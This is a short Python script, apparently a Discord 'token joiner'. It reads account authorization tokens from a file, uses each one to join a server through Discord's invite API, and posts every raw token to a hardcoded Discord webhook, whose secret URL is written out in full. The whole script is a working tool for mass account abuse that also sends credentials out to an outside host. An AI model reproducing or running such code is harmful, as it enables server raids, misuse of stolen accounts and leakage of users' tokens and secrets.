import requests
from dhooks import Webhook, Embed

hook = Webhook('https://discord.com/api/webhooks/936357867596959844/NYcifveEgQrdeXNDBHuSu9O-g_XAXh2Om6LUp37KO9A6hsMVZjlYE_fH96Xx-5dNjDVi')

embed = Embed(
    description='test webhook',
    color=0x5CDBF0,
    timestamp='now'  # sets the timestamp to current time
    )

link = input('Discord Invite Link: ')
if len(link) > 6:
    link = link[19:]
apilink = "https://discordapp.com/api/v6/invite/" + str(link)

print (link)

with open('tokens.txt','r') as handle:
        tokens = handle.readlines()
        for x in tokens:
            token = x.rstrip()
            headers={
                'Authorization': token
                }
            requests.post(apilink, headers=headers)
            embed.set_footer(f'{token} has joined the invite {link}')
            hook.send(embed = embed)

